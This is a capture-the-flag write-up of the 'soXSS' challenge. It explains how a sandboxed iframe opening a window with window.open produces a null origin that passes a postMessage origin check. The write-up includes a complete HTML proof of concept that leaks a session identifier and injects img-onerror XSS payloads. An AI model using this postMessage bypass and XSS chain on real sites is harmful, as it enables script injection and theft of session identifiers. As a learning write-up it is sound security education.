## soXSS

![2022-04-07_01-54](https://user-images.githubusercontent.com/59454895/162093274-f54f182c-1dae-4f29-98ce-a7e1792f40fd.png)

## Let's begin

The first thing that can be noticed in the challenge is the use of post-messages and also the use of dompurify ( The latest version of the library was in use, so we couldn't bypass DomPurify without having a 0day ), as you can see from this screen:

![2022-04-07_02-01](https://user-images.githubusercontent.com/59454895/162093835-fd21e646-42a8-4395-b241-62196c4346ec.png)


Furthermore, at the following link (https://so-xss.terjanq.me/iframe.php/?source) it is possible to notice another part of the code, here the goal is very straightforward, the highlighted condition needs to be bypassed in order to reach the sink and execute XSS.

![2022-04-07_02-07](https://user-images.githubusercontent.com/59454895/162094500-690c045b-eaf3-44e0-bee3-82b866bf9d34.png)

The functioning of this part of the code is very clear, a listener event was used in order to check that the source and the identifier are not different, it's also important to say that the identifier is stored in an user's session.

First of all it was necessary to find a way to bypass this check ```e.origin !== window.origin```, After hitting my head a bit I found this thread on StackOverflow that really helped me a lot (https://stackoverflow.com/questions/55451493/what-is-window-origin,  https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#attr-sandbox), apparently if we embed the iframe via ```<iframe src="https://so-xss.terjanq.me/iframe.php" sandbox>``` we can force the ```null``` origin.

Now another problem arises, as the page cannot be embedded inside an iframe because there was the flag ```X-Frame-Options: SAMEORIGIN```. It means that the page can only be displayed in a frame on the same origin as the page itself. 

### There is still hope

One important feature proved very important to overcome this problem, all windows opened from sandbox iframe inherit the sandbox flag, as documentated here: https://www.w3.org/TR/2010/WD-html5-20100624/the-iframe-element.html.
It means that we don't need to put the page inside an iframe, we can just created a sandbox iframe and use ```window.open``` inside it, like this:
```javascript
<iframe id=f sandbox="allow-scripts allow-top-navigation allow-forms allow-modals allow-popups" srcdoc="<button onclick=run()>click me 1</button><script>
  function run() {
    var win = window.open('https://so-xss.terjanq.me/iframe.php')
    setTimeout(() => {
      win.postMessage({
            identifier: 'abc',
            type: 'render',
            body: `<img src=x onerror=opener.top.postMessage({identifier},'*')>`,
        }, '*');
    }, 2000)
  }
</script>"></iframe>
```
In this way the newly opened window inherit the sandbox flag and his origin will become null. Just to be more clear, it means that the iframe with the ```sandbox``` attribute and the window for iframe.php (which is accessible by the variable win) share the same origin null.
Now another issue appears, The page on iframe.php has the origin "null", so we can't access any resources on the origin ```so-xss.terjanq.me``` and the rules says that we need to execute xss on that origin.

This is where the parameter ```identifier``` comes into play, because it's possible to open ```https://so-xss.terjanq.me/iframe.php``` and send XSS with stolen identifier so the origin is ```so-xss.terjanq.me```.

This is the final poc :
```javascript
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>test</title>
  </head>
  <body>
    <iframe id=f sandbox="allow-scripts allow-top-navigation allow-forms allow-modals allow-popups" srcdoc="<button onclick=run()>click me 1</button><script>
      function run() {
        var win = window.open('https://so-xss.terjanq.me/iframe.php')
        setTimeout(() => {
          win.postMessage({
                identifier: 'abc',
                type: 'render',
                body: `<img src=x onerror=opener.top.postMessage({identifier},'*')>`,
            }, '*');
        }, 2000)
      }
    </script>"></iframe><button onclick="run()">click me 2</button>
    <script>
      var realWin
      var identifier

      function send() {
        if (!realWin) {
          setTimeout(send, 500)
          return
        }

        // give it some time to load
        setTimeout(() => {
          realWin.postMessage({
            identifier,
            type: 'render',
            body: `<img src=x onerror=alert(origin)>`,
          }, '*');
        }, 1000)
        
      }
      onmessage = (e) => {
        if (e.data && e.data.identifier) {
          identifier = e.data.identifier
          console.log('identifier:', identifier)
          send()
        }
      }
      function run() {
        realWin = window.open('https://so-xss.terjanq.me/iframe.php')
      }

    </script>
  </body>
</html> 
```
To resume :

1) Open https://so-xss.terjanq.me/iframe.php from a sandboxed iframe with ```window.open```, so in this way the newly opened window inherit the sandbox flag and his origin will become null.
2) Open https://so-xss.terjanq.me/iframe.php and send the XSS with the stolen identifier, in this way the origin will be ```so-xss.terjanq.me.```

To conclude I would like to thank huli who helped me to write and fix some bugs on the final poc (I suck with javascript syntax lol), I also hope someone will find this writeup useful for learning something new


